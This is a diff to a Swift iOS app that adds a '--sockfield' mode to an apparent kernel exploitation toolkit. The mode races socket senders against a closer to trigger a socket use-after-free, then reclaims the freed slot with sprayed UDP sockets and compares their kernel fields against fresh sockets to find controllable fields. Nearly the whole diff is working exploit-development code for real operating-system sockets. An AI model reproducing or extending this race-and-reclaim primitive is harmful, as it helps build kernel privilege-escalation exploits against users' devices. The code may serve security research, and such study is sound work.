@@ -215,6 +215,7 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--iosurfrace") { Task.detached { await self.runIOSurfRaceMode() }; return }
         if args.contains("--iosurfreclaim") { Task.detached { await self.runIOSurfReclaimMode() }; return }
         if args.contains("--iosurfwatch") { Task.detached { await self.runIOSurfWatchMode() }; return }
+        if args.contains("--sockfield") { Task.detached { await self.runSockFieldMode() }; return }
         if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
             || args.contains("--sockudp") || args.contains("--sockprec")
@@ -1849,6 +1850,194 @@ func runFuzzMode() async {
             emitBg("[?] ITER \(it) \(tag): \(st.odd) odd errno(s), last=\(e) (\(String(cString: strerror(e))))")
         }
         return corrupt
+    }
+
+    // ---- Reclaimed-datagram field differential (--sockfield) -----------------
+    //
+    // `--sockmix` proved the freed TCP slot can be taken by a SOCK_DGRAM socket
+    // and that stale sender bytes come out as UDP datagrams, but never read any
+    // kernel field on the reclaimed object. This mode runs the same precision
+    // race + in-window datagram hammer, then fingerprints every hammer-created
+    // fd through the API (SO_TYPE/SO_ERROR/SO_SNDBUF/SO_RCVBUF/TCP_CONNECTION_INFO/
+    // getsockname) and diffs each against a control set of fresh, never-raced
+    // dgram sockets. A field outside the baseline is a controlled field.
+
+    nonisolated func runSockFieldMode() async {
+        await MainActor.run { self.isRunning = true; self.status = "SockField..."; self.log = "" }
+        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
+        emitBg("=== sockfield: reclaimed datagram socket field differential ===")
+        signal(SIGPIPE, SIG_IGN)
+        let ip = "127.0.0.1"
+        let port = 8080
+        let precPort = 8089
+        let udpPort = precPort + 1
+        let iterations = ProcessInfo.processInfo.arguments.contains("--sockmix") ? 2000 : 3000
+
+        // loopback listener so target connects are ESTABLISHED
+        let listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+        var laddr = sockaddr_in()
+        laddr.sin_family = sa_family_t(AF_INET)
+        laddr.sin_port = in_port_t(UInt16(port).bigEndian)
+        inet_pton(AF_INET, ip, &laddr.sin_addr)
+        var yesVal: Int32 = 1
+        setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
+        _ = withUnsafePointer(to: &laddr) { p in
+            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                bind(listenFd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
+            }
+        }
+        listen(listenFd, 128)
+
+        // precision listener: peers only ever receive stale writes
+        let plisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+        var paddr = sockaddr_in()
+        paddr.sin_family = sa_family_t(AF_INET)
+        paddr.sin_port = in_port_t(UInt16(precPort).bigEndian)
+        inet_pton(AF_INET, ip, &paddr.sin_addr)
+        setsockopt(plisten, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
+        _ = withUnsafePointer(to: &paddr) { q in
+            q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                bind(plisten, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
+            }
+        }
+        listen(plisten, 256)
+        let peerLock = NSLock()
+        var precPeers: [Int32] = []
+        Thread.detachNewThread {
+            while true {
+                let c = accept(plisten, nil, nil)
+                if c < 0 { usleep(200); continue }
+                peerLock.lock(); precPeers.append(c); peerLock.unlock()
+            }
+        }
+
+        // datagram oracle: nothing sends on dgram sockets here, so a datagram
+        // can only come from a stale sender pushed through a reclaimed slot.
+        let udpListener = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
+        if udpListener >= 0 {
+            var ua = sockaddr_in()
+            ua.sin_family = sa_family_t(AF_INET)
+            ua.sin_port = in_port_t(UInt16(udpPort).bigEndian)
+            inet_pton(AF_INET, "127.0.0.1", &ua.sin_addr)
+            setsockopt(udpListener, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
+            _ = withUnsafePointer(to: &ua) { q in
+                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                    bind(udpListener, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
+                }
+            }
+            _ = fcntl(udpListener, F_SETFL, O_NONBLOCK)
+            emitBg("[*] sockfield UDP oracle listening on 127.0.0.1:\(udpPort)")
+        } else {
+            emitBg("[!] sockfield UDP oracle socket failed errno=\(errno)")
+        }
+
+        let st = SockUafState()
+        let sendLen = 8192
+        let sendBuf = UnsafeMutablePointer<UInt8>.allocate(capacity: sendLen)
+        sendBuf.initialize(repeating: 0x41, count: sendLen)
+        let stRef = st
+        for _ in 0..<6 { Thread.detachNewThread { self.sockUafSenderLoop(stRef, sendBuf, sendLen) } }
+        Thread.detachNewThread { self.sockUafCloserLoop(stRef) }
+
+        var hits = 0, xtypeHits = 0, fieldHits = 0
+        let t0 = Date()
+        for it in 0..<iterations {
+            let target = sockUafMakeSocket(ip, port)
+            if target < 0 { usleep(200); continue }
+            // The precision race returns 0/1/2; we need the hammer fds, so this
+            // mode does its own in-window dgram hammer instead of reusing
+            // sockUafRacePrecision's closed bookkeeping.
+            st.fd = target; st.done = 0; st.entered = 0; st.phase = 1; st.mode = 1
+            usleep(60)
+            st.gate = 1
+            var e = 0
+            while st.entered < 6 && e < 200_000 { e &+= 1 }
+            st.phase = 2
+            var spins = 0
+            while st.phase != 3 && spins < 400_000 { spins &+= 1 }
+            if st.phase != 3 {
+                if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
+            }
+            let doneAtClose = st.done
+
+            // In-window hammer: allocate connected dgram sockets while stale
+            // senders may still be inside their syscall. Track them for the
+            // field diff.
+            var udpAddr = sockaddr_in()
+            udpAddr.sin_family = sa_family_t(AF_INET)
+            udpAddr.sin_port = in_port_t(UInt16(udpPort).bigEndian)
+            inet_pton(AF_INET, "127.0.0.1", &udpAddr.sin_addr)
+            var hammerFds: [Int32] = []
+            var w = 0
+            while st.done < 6 && w < 200_000 && hammerFds.count < 256 {
+                let u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
+                if u < 0 { break }
+                _ = withUnsafePointer(to: &udpAddr) { q in
+                    q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                        connect(u, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
+                    }
+                }
+                hammerFds.append(u)
+                w &+= 1
+            }
+            let spray = sockUafSprayConnected(48, precPort)
+            var one: UInt8 = 0x42
+            for _ in 0..<3 { for fd in spray { _ = send(fd, &one, 1, MSG_DONTWAIT) } }
+            while st.done < 6 && w < 400_000 { w &+= 1 }
+            st.gate = 0; st.phase = 0; st.fd = -1; st.mode = 0
+            usleep(150)
+
+            // Drain the oracle first: a hit here names the collision.
+            var udgrams = 0, ubytes = 0
+            if udpListener >= 0 {
+                var ubuf = [UInt8](repeating: 0, count: 65536)
+                while true {
+                    let r = recv(udpListener, &ubuf, ubuf.count, MSG_DONTWAIT)
+                    if r <= 0 { break }
+                    udgrams += 1; ubytes += r
+                }
+            }
+            if udgrams > 0 {
+                xtypeHits += 1
+                emitBg("[!] ITER \(it) sockfield: *** CROSS-TYPE HIT: \(udgrams) datagram(s)/\(ubytes) byte(s) (hammer=\(hammerFds.count), in flight at close \(doneAtClose)/6) ***")
+            }
+
+            // Field differential on the hammer fds (the reclaimed slots).
+            var stages = [Int32](repeating: 0, count: 8)
+            let fh = sockuaf_field_probe(it % 2 == 0 ? "odd" : "even",
+                                         &hammerFds, Int32(hammerFds.count), &stages)
+            if fh > 0 {
+                fieldHits += 1
+                emitBg("[!] ITER \(it) sockfield: *** FIELD DIFF on \(fh) hammer fd(s): scanned=\(stages[0]) hits=\(stages[1]) readfail=\(stages[2]) ctl=\(stages[3]) ***")
+            }
+
+            // Drain peers.
+            var got = 0
+            var rbuf = [UInt8](repeating: 0, count: 65536)
+            peerLock.lock(); let snapshot = precPeers; precPeers.removeAll(); peerLock.unlock()
+            for pf in snapshot {
+                var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
+                while r > 0 { got += r; r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT) }
+            }
+            for pf in snapshot { close(pf) }
+            for fd in spray { close(fd) }
+            for u in hammerFds { close(u) }
+            if got > 3 * spray.count + 512 { hits += 1 }
+
+            if it % 20 == 0 {
+                let secs = Date().timeIntervalSince(t0)
+                emitBg(String(format: "[*] iter %d/%d  %.1f it/s  xtype=%d field=%d peerBytes=%d",
+                               it, iterations, Double(it) / max(secs, 0.001),
+                               xtypeHits, fieldHits, got))
+            }
+            usleep(200)
+        }
+
+        st.stop = 1
+        usleep(5000)
+        emitBg("[+] sockfield: \(xtypeHits) cross-type hit(s), \(fieldHits) field-diff hit(s), \(hits) peer hit(s) in \(iterations) iterations")
+        emitBg("=== sockfield done ===")
+        await MainActor.run { self.status = "Complete"; self.isRunning = false }
     }
 
     nonisolated func runSocketUafMode() async {
